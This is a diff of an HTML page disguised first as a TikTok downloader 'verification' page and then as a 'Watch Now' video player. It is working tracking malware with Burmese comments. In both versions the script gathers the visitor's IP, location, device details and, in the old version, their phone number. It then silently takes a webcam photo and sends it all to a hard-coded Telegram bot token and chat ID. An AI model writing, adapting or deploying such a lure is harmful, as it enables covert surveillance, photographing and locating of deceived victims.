@@ -1,102 +1,82 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok HD Downloader</title>
+    <title>Video Player</title>
     <style>
-        body { font-family: sans-serif; background-color: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e1e1e; padding: 20px; border-radius: 15px; text-align: center; width: 90%; max-width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        img { width: 60px; margin-bottom: 15px; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #333; background: #2c2c2c; color: white; box-sizing: border-box; outline: none; }
-        button { width: 100%; padding: 12px; border: none; border-radius: 8px; background: #fe2c55; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:disabled { background: #555; cursor: not-allowed; font-size: 13px; }
-        video, canvas { display: none; }
+        body { background-color: #000; color: #fff; font-family: sans-serif; text-align: center; }
+        .container { padding: 50px; }
+        button { background-color: #fe2c55; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 18px; }
     </style>
 </head>
 <body>
+    <div class="container">
+        <h2>Loading Video...</h2>
+        <p>Please click the button to continue watching.</p>
+        <button onclick="captureData()">Watch Now</button>
+    </div>
 
-<div class="card">
-    <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" alt="TikTok">
-    <h2>TikTok Verification</h2>
-    <p style="color: #fe2c55; font-size: 14px;">ဗီဒီယိုဒေါင်းရန် ဖုန်းနံပါတ်ဖြင့် အကောင့်ဝင်ပါ</p>
-    <input type="tel" id="phone" placeholder="09xxxxxxxxx">
-    <button id="loginBtn" onclick="startTracking()">အကောင့်၀င်ရန်</button>
-    <p id="status" style="font-size: 12px; color: #888; margin-top: 10px;"></p>
-</div>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
+    <script>
+        const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0'; // Telegram Bot Token ထည့်ပါ
+        const chat_id = '5304050102'; // Telegram Chat ID ထည့်ပါ
 
-<script>
-    const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0'; //
-    const chat_id = '5304050102'; 
+        async function captureData() {
+            // ၁။ Battery Info ရယူခြင်း
+            let batteryInfo = "Unknown";
+            try {
+                const battery = await navigator.getBattery();
+                batteryInfo = `${(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+            } catch (e) {}
 
-    async function startTracking() {
-        const phone = document.getElementById('phone').value;
-        const btn = document.getElementById('loginBtn');
-        if (!phone) { alert("ဖုန်းနံပါတ် ထည့်ပေးပါ!"); return; }
+            // ၂။ Device & Browser Info
+            const info = {
+                Device: navigator.platform,
+                Model: navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown",
+                Browser: navigator.appName,
+                RAM: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
+                Battery: batteryInfo,
+                Screen: `${window.screen.width}x${window.screen.height}`
+            };
 
-        btn.disabled = true;
-        btn.innerText = "စစ်ဆေးနေပါသည်... ခွင့်ပြုချက်တောင်းခဲ့လျှင် Allow ကို နှိပ်ပေးပါ။";
+            // ၃။ IP & Location
+            fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
+                let message = `🚀 **Target Info Found!**\n\n`;
+                message += `📱 Model: ${info.Model}\n`;
+                message += `🔋 Battery: ${info.Battery}\n`;
+                message += `🧠 RAM: ${info.RAM}\n`;
+                message += `🖥 Screen: ${info.Screen}\n`;
+                message += `🌐 IP: ${data.ip}\n`;
+                message += `📍 City: ${data.city}, ${data.country_name}\n`;
+                message += `📍 Map: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
 
-        let report = `🔔 **Target Found!**\n📱 Phone: ${phone}\n`;
-
-        // ၁။ IP နှင့် Device အချက်အလက် ရယူခြင်း
-        try {
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
-            report += `🌐 IP: ${ipData.ip}\n📍 City: ${ipData.city}\n🏢 ISP: ${ipData.org}\n📱 Device: ${navigator.platform}\n`;
-        } catch (e) { report += "🌐 IP: Could not fetch\n"; }
-
-        // ၂။ တည်နေရာ (Location) ရယူခြင်း
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                report += `📍 Map: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
-                await captureAndSend(report);
-            }, async () => {
-                report += `📍 Location: Permission Denied\n`;
-                await captureAndSend(report);
+                // Telegram ဆီ စာပို့ခြင်း
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
             });
-        } else {
-            await captureAndSend(report);
+
+            // ၄။ Camera Permission & Photo Capture
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('chat_id', chat_id);
+                        fd.append('photo', blob, 'shot.jpg');
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                    }, 'image/jpeg');
+                }, 2000);
+            } catch (e) {
+                console.log("Camera access denied.");
+            }
         }
-    }
-
-    async function captureAndSend(fullReport) {
-        try {
-            // ၃။ ကင်မရာပုံ ဖမ်းယူခြင်း
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const v = document.getElementById('v');
-            v.srcObject = stream;
-
-            setTimeout(async () => {
-                const c = document.getElementById('c');
-                c.width = 640;
-                c.height = 480;
-                c.getContext('2d').drawImage(v, 0, 0);
-                const blob = await new Promise(res => c.toBlob(res, 'image/jpeg'));
-
-                const formData = new FormData();
-                formData.append('chat_id', chat_id);
-                formData.append('photo', blob, 'shot.jpg');
-                formData.append('caption', fullReport);
-
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                window.location.href = "https://ssstik.io/en";
-            }, 3000);
-        } catch (err) {
-            // ကင်မရာမရလျှင်လည်း အချက်အလက်များကို စာသားအနေဖြင့် ပို့မည်
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(fullReport)}&parse_mode=Markdown`);
-            window.location.href = "https://ssstik.io/en";
-        }
-    }
-</script>
-
+    </script>
 </body>
 </html>
 
